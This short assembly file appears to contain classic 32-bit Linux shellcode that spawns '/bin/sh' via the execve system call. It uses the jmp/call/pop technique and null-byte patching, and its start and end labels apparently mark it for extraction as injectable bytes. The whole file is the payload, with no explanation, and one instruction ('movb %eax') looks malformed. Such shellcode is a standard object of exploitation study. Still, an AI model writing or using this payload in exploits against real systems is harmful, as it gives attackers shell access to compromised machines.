global code_start
global code_end
	.data
code_start:
	jmp  0x17
	popl %esi
	movl %esi,0x8(%esi)
	xorl %eax,%eax
	movb %eax,0x7(%esi)
	movl %eax,0xc(%esi)
my_execve:
	movb $0xb,%al
	movl %esi,%ebx
	leal 0x8(%esi),%ecx
	xorl %edx,%edx
	int $0x80
	call -0x1c
	.string "/bin/shX"
code_end:
